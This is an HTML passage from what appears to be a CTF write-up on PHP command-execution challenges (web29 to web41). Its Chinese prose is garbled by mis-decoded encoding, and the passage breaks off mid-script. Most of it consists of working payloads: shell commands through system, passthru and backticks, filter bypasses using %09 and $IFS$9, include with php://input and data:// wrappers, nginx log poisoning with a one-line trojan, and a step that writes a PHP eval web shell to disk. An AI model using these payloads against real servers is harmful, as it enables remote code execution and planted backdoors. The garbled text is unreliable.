‰ªéÊ†áÂáÜËæìÂÖ•ËØªÂèñÔºåÂÜçÂÜôÂÖ•Ê†áÂáÜËæìÂá∫ÂíåÊñá‰ª∂„ÄÇ Eg:  ls &#x2F; | tee 1.txt</p><p>2.ÂèçÂºπshell</p><p>3.dnslogÂ§ñÂ∏¶</p><h5 id="‰∏ãÂàíÁ∫øÁöÑÊ≠£ÂàôÁªïËøá"><a href="#‰∏ãÂàíÁ∫øÁöÑÊ≠£ÂàôÁªïËøá" class="headerlink" title="‰∏ãÂàíÁ∫øÁöÑÊ≠£ÂàôÁªïËøá"></a>‰∏ãÂàíÁ∫øÁöÑÊ≠£ÂàôÁªïËøá</h5><p> Ëøô‰∏™Ê≠£ÂàôÁöÑÁªïËøáÊñπÊ≥ïÂ∞±ÊòØÂà©Áî®ÁâπÊÄßÊù•ÁªïËøáÔºåÂèØ‰ª•Áî®</p><p>„ÄÄ[</p><p> (Á©∫Ê†º)</p><p> + „ÄÄ</p><p> .</p><p>‰∏äÈù¢ÈÇ£Âá†‰∏™Â≠óÁ¨¶‰ªª‰Ωï‰∏Ä‰∏™ÈÉΩË°åÔºåÈÉΩÂèØ‰ª•Ë¢´Â§ÑÁêÜÊàê_</p><h3 id="web29-124"><a href="#web29-124" class="headerlink" title="web29-124"></a>web29-124</h3><h4 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h4><p>Âè™ÊòØËøáÊª§‰∫ÜÁÆÄÂçïÁöÑflagÂ≠óÁ¨¶ÔºåÁõ¥Êé•‰ΩøÁî®systemÂáΩÊï∞</p><p>Payload:</p><blockquote><p>1„ÄÅÁî®egrepÊïàÊûú‰∏ÄÊ†∑egrep&#x3D;grep  -E<br>c&#x3D;system(‚Äúcat fl<em>g.php | grep  -E ‚Äòfl.g‚Äô ‚Äú);<br>2„ÄÅÊ≠§ÁßçÊñπÂºèÈúÄË¶ÅÂè≥ÈîÆÊ∫ê‰ª£Á†Å<br>c&#x3D;system(‚Äúcat fl</em>g.php‚Äù);<br>3„ÄÅ</p><p>c&#x3D;system(‚Äútac fl<em>g.php‚Äù);<br>4„ÄÅÂÄíÂ∫èËæìÂá∫ÊñáÊú¨<br>c&#x3D;system(‚Äútac fl</em>ag.php‚Äù);<br>5„ÄÅ<br>c&#x3D;system(‚Äúcp fl*g.php a.txt ‚Äú);<br>ËÆøÈóÆ&#x2F;a.txt<br>6„ÄÅÁõ¥Êé•ËæìÂá∫‰∏Ä‰∏™phpËøôÊ†∑Â∞±ÂèØ‰ª•Áõ¥Êé•Âà©Áî®‰ª£Á†Å‰∫Ü,Ê≥®ÊÑè‰πüÊòØÂè≥ÈîÆÊü•ÁúãÊ∫ê‰ª£Á†Å<br>c&#x3D;system(‚Äòecho -e ‚Äú &lt;?php \n error_reporting(0); \n  $c&#x3D; $_GET[&#39;c&#39;]; \n eval($c); ‚Äú &gt; a.php‚Äô);<br>&#x2F;a.php?c&#x3D;system(‚Äútac flag.php‚Äù);</p></blockquote><h4 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h4><p>ËøáÊª§‰∫ÜsystemÂáΩÊï∞ÔºåÂèØ‰ª•Áî®ÂèçÂºïÂè∑Êù•ÂëΩ‰ª§ÊâßË°å</p><p>Payload:</p><blockquote><p>1„ÄÅnlÂëΩ‰ª§ÔºåÂ∏¶ÁùÄË°åÂè∑ËæìÂá∫ÊñáÊú¨ÂÜÖÂÆπ<br>c&#x3D;echo <code>nl fl&#39;&#39;ag.p&#39;&#39;hp</code>;<br>echo <code>cat fl&#39;&#39;ag.p&#39;&#39;hp</code>;<br>echo <code>cat fl*ag.p*hp</code>;<br>echo <code>cp fl*ag.p*hp 1.txt | cat 1.txt</code>;<br>ÂçïÂºïÂè∑ÔºöÂºïÂè∑ÈáåÈù¢ÁöÑÂÜÖÂÆπ‰ºöÂéüÂ∞Å‰∏çÂä®ÁöÑÊòæÁ§∫Âá∫Êù•ÔºàÂæàÁÆÄÂçïÔºå‰∏çÂÅöËß£ÈáäÔºâ<br>ÂèåÂºïÂè∑ÔºöÈáåÈù¢ÁöÑÁâπÊÆäÁ¨¶Âè∑‰ºöË¢´Ëß£ÊûêÔºåÂèòÈáè‰πü‰ºöË¢´ÊõøÊç¢Ôºà\ Á¨¶Âè∑„ÄÅÁ©∫Ê†º‰ºöË¢´Ëß£ÊûêÔºâ<br>echo \a -&gt; a<br>echo ‚Äú\a‚Äù -&gt; \a<br>2„ÄÅpassthruÂáΩÊï∞ÔºåÂêåsystemÔºåÂêåÁêÜexecÔºåshell_exec‰πüÂèØ‰ª•Áî®Ôºå‰∏çËøáÊúâÁÇπÈ∫ªÁÉ¶<br>c&#x3D;passthru(‚Äúcat fla*‚Äù);<br>c&#x3D;exec(passthru(‚Äúcat fla*‚Äù));<br>c&#x3D;shell_exec(passthru(‚Äúcat fla*‚Äù));</p></blockquote><h4 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h4><p>È¢òÁõÆËøáÊª§‰∫ÜÁ©∫Ê†ºÔºåÂçïÂºïÂè∑ÔºåÂ∞èÊï∞ÁÇπÔºå</p><p>ËøáÊª§‰∫ÜÁ©∫Ê†ºÔºåÂèØ‰ª•‰ΩøÁî®%09Êõø‰ª£Ôºõ‰πüÂèØ‰ª•‰ΩøÁî®{$IFS}ÔºåÂõ†‰∏∫ÂçïÂºïÂè∑Ë¢´ËøáÊª§‰∫ÜÔºåÊâÄ‰ª•Â¶ÇÊûú‰ΩøÁî®c&#x3D;passthru(‚Äúcat%09fla*‚Äù);ÊàñËÄÖ{$IFS}ÈÉΩ‰∏ç‰ºöË¢´Ëß£Èáä‰∏∫Á©∫Ê†º</p><p>ÊâÄ‰ª•ÊûÑÈÄ†Â¶Ç‰∏ãPayload:</p><blockquote><p>1„ÄÅ‰ΩøÁî®evalÂµåÂ•ó„ÄÇÂÖ∑‰ΩìÂèÇÊï∞Ôºöpassthru ÁªìÂêà%09Ôºå‰πüÂèØ‰ª•Áõ¥Êé•rceÔºåÂõ†‰∏∫Ê≤°ÊúâÂØπÂÖ∂‰ªñÂèÇÊï∞ËøõË°åËøáÊª§<br>ÂÖ∂‰∏≠%09ÁªïËøáÁ©∫Ê†º ?c&#x3D;eval($_GET[1]);&amp;1&#x3D;passthru(‚Äútac%09fla*‚Äù); ËøôÈáåÈúÄË¶ÅÊ≥®ÊÑèÊã¨Âè∑ÁöÑÈó≠ÂêàÔºå&amp;ÁöÑËøûÊé•„ÄÇ<br>2„ÄÅ‰ΩøÁî®ÂèÇÊï∞ÔºöpassthruÁªìÂêà $IFS$9<br>ÂÖ∂‰∏≠$IFS$9ÁªïËøáÁ©∫Ê†ºÔºåÊ≥®ÊÑèËΩ¨‰πâ$Á¨¶Âè∑ ?<br>$9ÊòØÂΩìÂâçÁ≥ªÁªüshellËøõÁ®ãÁöÑÁ¨¨‰πù‰∏™ÂèÇÊï∞ÁöÑÊåÅÊúâËÄÖÔºåÂÆÉÂßãÁªà‰∏∫Á©∫Â≠óÁ¨¶‰∏≤„ÄÇc&#x3D;eval($_GET[1]);&amp;1&#x3D;passthru(‚Äútac$IFS$9fla*‚Äù);<br>3„ÄÅ‰ΩøÁî®Êú™Ë¢´ËøáÊª§ÁöÑÂëΩ‰ª§„ÄÇpassthruÁõ¥Êé•ËØªÂèñ<br>?c&#x3D;passthru(%22tac$IFS$9fla*%22); ‰πüÂ∞±ÊòØpassthru(‚Äútac$IFS$9fla*‚Äù);<br>4„ÄÅ‰ΩøÁî®pos(localeconv)Êù•Ëé∑ÂèñÂ∞èÊï∞ÁÇπ<br>localeconvÂèØ‰ª•ËøîÂõûÂåÖÊã¨Â∞èÊï∞ÁÇπÂú®ÂÜÖÁöÑ‰∏Ä‰∏™Êï∞ÁªÑÔºõposÂéªÂèñÂá∫Êï∞ÁªÑ‰∏≠ÂΩìÂâçÁ¨¨‰∏Ä‰∏™ÂÖÉÁ¥†Ôºå‰πüÂ∞±ÊòØÂ∞èÊï∞ÁÇπ„ÄÇ scandirÂèØ‰ª•ÁªìÂêàÂÆÉÊâ´ÊèèÂΩìÂâçÁõÆÂΩïÂÜÖÂÆπ„ÄÇ ?c&#x3D;print_r(scandir(pos(localeconv()))); ÂèØ‰ª•ÁúãÂà∞ÂΩìÂâçÁõÆÂΩï‰∏ãÊúâflag.php ÈÄöËøáarray_reverseÊääÊï∞ÁªÑÈÄÜÂ∫èÔºåÈÄöËøánextÂèñÂà∞Á¨¨‰∫å‰∏™Êï∞ÁªÑÂÖÉÁ¥†Ôºå‰πüÂç≥flag.php ÁÑ∂Âêé?c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));</p></blockquote><h4 id="web32-nginxÊó•ÂøóÊ≥®ÂÖ•"><a href="#web32-nginxÊó•ÂøóÊ≥®ÂÖ•" class="headerlink" title="web32(nginxÊó•ÂøóÊ≥®ÂÖ•)"></a>web32(nginxÊó•ÂøóÊ≥®ÂÖ•)</h4><p>ËøáÊª§Êéâ‰∫Üflag|system|php|cat|sort|shell|.| |‚Äô|&#96;|echo|;|( ÂåÖÊã¨ÁÇπÔºåÂçïÂºïÂè∑ÔºåÂèçÂºïÂè∑ÔºåÂàÜÂè∑ÔºåÊã¨Âè∑</p><p>ÊâÄ‰ª•ËøôÈáåÈúÄË¶Å‰ΩøÁî®includeÊù•ÊûÑÈÄ†Payload:</p><blockquote><p>1„ÄÅ?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<br>ÂÖ∂‰∏≠?&gt;‰ª£ÊõøÂàÜÂè∑ÔºåÈ°µÈù¢‰ºöÊòæÁ§∫flag.phpÂÜÖÂÆπÁöÑbase64ÁºñÁ†ÅÔºåËß£Á†ÅÂç≥ÂèØËé∑Âèñflag<br>ËøòÊúâ‰∏ÄÁßçÊñπÊ≥ïÔºåÊó•ÂøóÊ≥®ÂÖ•<br>2„ÄÅ?c&#x3D;include$_GET[1]?%3E&amp;1&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<br>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.logÊòØnginxÈªòËÆ§ÁöÑaccessÊó•ÂøóË∑ØÂæÑÔºåËÆøÈóÆËØ•Ë∑ØÂæÑÊó∂ÔºåÂú®User-Agent‰∏≠ÂÜôÂÖ•‰∏ÄÂè•ËØùÊú®È©¨ÔºåÁÑ∂ÂêéÁî®‰∏≠ÂõΩËöÅÂâëËøûÊé•Âç≥ÂèØ</p><p>3„ÄÅ?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;input</p><p>‰πüÂèØ‰ª•‰ΩøÁî®php:&#x2F;&#x2F;inputÁÑ∂Âêé‰ΩøÁî®postÊâßË°åÂëΩ‰ª§<?php system("cat flag.php")?></p></blockquote><h4 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h4><p>Áõ∏ÊØî‰∏ä‰∏ÄÂÖ≥Âè™Â§öËøáÊª§‰∫Ü‚Äú</p><p>ÊâÄ‰ª•web32Payload‰æùÊóßÈÄÇÁî®</p><h4 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h4><p>Â§öËøáÊª§‰∏Ä‰∏™:  ‰πãÂâçpayload‰æùÊóßÈÄÇÁî®</p><h4 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h4><p>Â§öËøáÊª§‰∏Ä‰∏™&#x3D; &lt;   ‰πãÂâçpayload‰æùÊóßÈÄÇÁî®</p><h4 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h4><p>Â§öËøáÊª§‰∫ÜÊï∞Â≠ó  GETÂèÇÊï∞Êîπ‰∏∫aÂç≥ÂèØ</p><h4 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>preg <span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span>Ôºå<span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><blockquote><p>1„ÄÅ‰ΩøÁî®php:&#x2F;&#x2F;input POSTÂÜôÂÖ•php‰ª£Á†Å</p><?php system("cat fla*")?><p>2„ÄÅ‰ΩøÁî®dataÂçèËÆÆ</p><p>c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4&#x3D;</p><?php system("tac flag.php")?></blockquote><h4 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h4><p>web37PayloadÁÖßÊ†∑Êâì</p><h4 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> </code></pre><p>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php%20system("tac fla*.php");?><br>?&gt;‰∏∫phpÁªìÊùüÁ¨¶Âè∑ÔºåÂêéÈù¢ÊãºÊé•ÁöÑ.php‰ºöË¢´ÂøΩÁï•ÊéâÔºå‰∏çÁî®ÁÆ°</p><h4 id="web40-Êï∞ÁªÑÂáΩÊï∞"><a href="#web40-Êï∞ÁªÑÂáΩÊï∞" class="headerlink" title="web40(Êï∞ÁªÑÂáΩÊï∞)"></a>web40(Êï∞ÁªÑÂáΩÊï∞)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\Ôºà|\Ôºâ|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\'|\"|\,|\&lt;|\.|\>|\/|\?|\\\\/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     </code></pre><p>ËøôÊ¨°Ê∑ªÂä†‰∫ÜÂæàÂ§öËøáÊª§Ôºå‰πãÂâçÊñπÊ≥ïÂ§ßÂ§öÈÉΩ‰∏çË°å‰∫Ü</p><blockquote><p>1„ÄÅc&#x3D;show_source(next(array_reverse(scandir(pos(localeconv()))))); ÊàñËÄÖ c&#x3D;show_source(next(array_reverse(scandir(getcwd()))));</p><p>getcwd() ÂáΩÊï∞ËøîÂõûÂΩìÂâçÂ∑•‰ΩúÁõÆÂΩï„ÄÇÂÆÉÂèØ‰ª•‰ª£Êõøpos(localeconv())</p><p>localeconv()ÔºöËøîÂõûÂåÖÂê´Êú¨Âú∞ÂåñÊï∞Â≠óÂíåË¥ßÂ∏ÅÊ†ºÂºè‰ø°ÊÅØÁöÑÂÖ≥ËÅîÊï∞ÁªÑ„ÄÇËøôÈáå‰∏ªË¶ÅÊòØËøîÂõûÂÄº‰∏∫Êï∞ÁªÑ‰∏îÁ¨¨‰∏ÄÈ°π‰∏∫‚Äù.‚Äù</p><p>pos():ËæìÂá∫Êï∞ÁªÑÁ¨¨‰∏Ä‰∏™ÂÖÉÁ¥†Ôºå‰∏çÊîπÂèòÊåáÈíàÔºõ</p><p>current() ÂáΩÊï∞ËøîÂõûÊï∞ÁªÑ‰∏≠ÁöÑÂΩìÂâçÂÖÉÁ¥†ÔºàÂçïÂÖÉÔºâ,ÈªòËÆ§ÂèñÁ¨¨‰∏Ä‰∏™ÂÄºÔºåÂíåpos()‰∏ÄÊ†∑</p><p>scandir() ÂáΩÊï∞ËøîÂõûÊåáÂÆöÁõÆÂΩï‰∏≠ÁöÑÊñá‰ª∂ÂíåÁõÆÂΩïÁöÑÊï∞ÁªÑ„ÄÇËøôÈáåÂõ†‰∏∫ÂèÇÊï∞‰∏∫‚Äù.‚ÄùÊâÄ‰ª•ÈÅçÂéÜÂΩìÂâçÁõÆÂΩï</p><p>array_reverse():Êï∞ÁªÑÈÄÜÁΩÆ</p><p>next():Â∞ÜÊï∞ÁªÑÊåáÈíàÊåáÂêë‰∏ã‰∏Ä‰∏™ÔºåËøôÈáåÂÖ∂ÂÆûÂèØ‰ª•ÁúÅÁï•ÂÄíÁΩÆÂíåÊîπÂèòÊï∞ÁªÑÊåáÈíàÔºåÁõ¥Êé•Âà©Áî®[2]ÂèñÂá∫Êï∞ÁªÑ‰πüÂèØ‰ª•</p><p>show_source():Êü•ÁúãÊ∫êÁ†Å</p><p>pos() ÂáΩÊï∞ËøîÂõûÊï∞ÁªÑ‰∏≠ÁöÑÂΩìÂâçÂÖÉÁ¥†ÁöÑÂÄº„ÄÇËØ•ÂáΩÊï∞ÊòØcurrent()ÂáΩÊï∞ÁöÑÂà´Âêç„ÄÇ</p><p>ÊØè‰∏™Êï∞ÁªÑ‰∏≠ÈÉΩÊúâ‰∏Ä‰∏™ÂÜÖÈÉ®ÁöÑÊåáÈíàÊåáÂêëÂÆÉÁöÑ‚ÄùÂΩìÂâç‚ÄùÂÖÉÁ¥†ÔºåÂàùÂßãÊåáÂêëÊèíÂÖ•Âà∞Êï∞ÁªÑ‰∏≠ÁöÑÁ¨¨‰∏Ä‰∏™ÂÖÉÁ¥†„ÄÇ</p><p>ÊèêÁ§∫ÔºöËØ•ÂáΩÊï∞‰∏ç‰ºöÁßªÂä®Êï∞ÁªÑÂÜÖÈÉ®ÊåáÈíà„ÄÇ</p><p>Áõ∏ÂÖ≥ÁöÑÊñπÊ≥ïÔºö</p><p>current()ËøîÂõûÊï∞ÁªÑ‰∏≠ÁöÑÂΩìÂâçÂÖÉÁ¥†ÁöÑÂÄº„ÄÇ</p><p>end()Â∞ÜÂÜÖÈÉ®ÊåáÈíàÊåáÂêëÊï∞ÁªÑ‰∏≠ÁöÑÊúÄÂêé‰∏Ä‰∏™ÂÖÉÁ¥†ÔºåÂπ∂ËæìÂá∫„ÄÇ</p><p>next()Â∞ÜÂÜÖÈÉ®ÊåáÈíàÊåáÂêëÊï∞ÁªÑ‰∏≠ÁöÑ‰∏ã‰∏Ä‰∏™ÂÖÉÁ¥†ÔºåÂπ∂ËæìÂá∫„ÄÇ</p><p>prev()Â∞ÜÂÜÖÈÉ®ÊåáÈíàÊåáÂêëÊï∞ÁªÑ‰∏≠ÁöÑ‰∏ä‰∏Ä‰∏™ÂÖÉÁ¥†ÔºåÂπ∂ËæìÂá∫„ÄÇ</p><p>reset()Â∞ÜÂÜÖÈÉ®ÊåáÈíàÊåáÂêëÊï∞ÁªÑ‰∏≠ÁöÑÁ¨¨‰∏Ä‰∏™ÂÖÉÁ¥†ÔºåÂπ∂ËæìÂá∫„ÄÇ</p><p>each()ËøîÂõûÂΩìÂâçÂÖÉÁ¥†ÁöÑÈîÆÂêçÂíåÈîÆÂÄºÔºåÂπ∂Â∞ÜÂÜÖÈÉ®ÊåáÈíàÂêëÂâçÁßªÂä®„ÄÇ</p><p>2„ÄÅc&#x3D;eval(array_pop(next(get_defined_vars())));&#x2F;&#x2F;ÈúÄË¶ÅPOST‰º†ÂÖ•ÂèÇÊï∞‰∏∫1&#x3D;system(‚Äòtac fl*‚Äô);</p><p>ÂêåÁêÜ?cmd&#x3D;system(‚Äútac%20flag.php‚Äù);&amp;c&#x3D;eval(pos(pos(get_defined_vars())));</p><p>get_defined_vars() ËøîÂõû‰∏Ä‰∏™ÂåÖÂê´ÊâÄÊúâÂ∑≤ÂÆö‰πâÂèòÈáèÁöÑÂ§öÁª¥Êï∞ÁªÑ„ÄÇËøô‰∫õÂèòÈáèÂåÖÊã¨ÁéØÂ¢ÉÂèòÈáè„ÄÅÊúçÂä°Âô®ÂèòÈáèÂíåÁî®Êà∑ÂÆö‰πâÁöÑÂèòÈáèÔºå‰æãÂ¶ÇGET„ÄÅPOST„ÄÅFILEÁ≠âÁ≠â„ÄÇ</p><p>next()Â∞ÜÂÜÖÈÉ®ÊåáÈíàÊåáÂêëÊï∞ÁªÑ‰∏≠ÁöÑ‰∏ã‰∏Ä‰∏™ÂÖÉÁ¥†ÔºåÂπ∂ËæìÂá∫„ÄÇ</p><p>array_pop() ÂáΩÊï∞Âà†Èô§Êï∞ÁªÑ‰∏≠ÁöÑÊúÄÂêé‰∏Ä‰∏™ÂÖÉÁ¥†Âπ∂ËøîÂõûÂÖ∂ÂÄº„ÄÇ</p><p>3„ÄÅc&#x3D;session_start();system(session_id());<br>      passid&#x3D;ls</p><p><img src="web40.png" alt="web40" loading="lazy"></p><p>ÈÄöËøácookieËé∑ÂæóÂèÇÊï∞ËøõË°åÂëΩ‰ª§ÊâßË°å</p><p>ÂèóphpÁâàÊú¨ÂΩ±Âìç 5.5 -7.1.9ÂùáÂèØ‰ª•ÊâßË°åÔºåÂõ†‰∏∫session_idËßÑÂÆö‰∏∫0-9Ôºåa-z,A-Z,-‰∏≠ÁöÑÂ≠óÁ¨¶„ÄÇÂú®5.5‰ª•‰∏ãÂèä7.1‰ª•‰∏äÂùáÊó†Ê≥ïÂÜôÂÖ•Èô§Ê≠§‰πãÂ§ñÁöÑÂÜÖÂÆπ„ÄÇ‰ΩÜÊòØÁ¨¶ÂêàË¶ÅÊ±ÇÁöÑÂ≠óÁ¨¶ËøòÊòØÂèØ‰ª•ÁöÑ„ÄÇ</p></blockquote><h4 id="web41-rce-or"><a href="#web41-rce-or" class="headerlink" title="web41(rce_or)"></a>web41(rce_or)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i'</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo(<span class="token interpolation"><span class="token variable">$c</span></span>);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> </code></pre><p>ËøáÊª§‰∫Ü<code>$„ÄÅ+„ÄÅ-„ÄÅ^„ÄÅ~</code>‰ΩøÂæó<strong>ÂºÇÊàñËá™Â¢ûÂíåÂèñÂèç</strong>ÊûÑÈÄ†Â≠óÁ¨¶ÈÉΩÊó†Ê≥ï‰ΩøÁî®ÔºåÂêåÊó∂ËøáÊª§‰∫ÜÂ≠óÊØçÂíåÊï∞Â≠ó„ÄÇ‰ΩÜÊòØÁâπÊÑèÁïô‰∫Ü‰∏™<code>|</code>ËøêÁÆóÁ¨¶</p><p>Ê†πÊçÆÊ≠£ÂàôÂåπÈÖçÁîüÊàêÂèØÁî®Â≠óÁ¨¶ÁöÑÈõÜÂêàrce_or.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"rce_or.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$contents</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span><span class="token number">256</span> <span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$hex_i</span><span class="token operator">=</span><span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$hex_i</span><span class="token operator">=</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$hex_j</span><span class="token operator">=</span><span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$hex_j</span><span class="token operator">=</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$preg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'%'</span><span class="token operator">.</span><span class="token variable">$hex_i</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token string single-quoted-string">'%'</span><span class="token operator">.</span><span class="token variable">$hex_j</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token class-name">urldecode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">>=</span><span class="token number">32</span><span class="token operator">&amp;</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">126</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$contents</span><span class="token operator">=</span><span class="token variable">$contents</span><span class="token operator">.</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span><span class="token variable">$contents</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>Ê†πÊçÆÂèØÁî®ÁöÑÂ≠óÁ¨¶ÁîüÊàêPayload</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> urllib<span class="token keyword">from</span> sys <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> 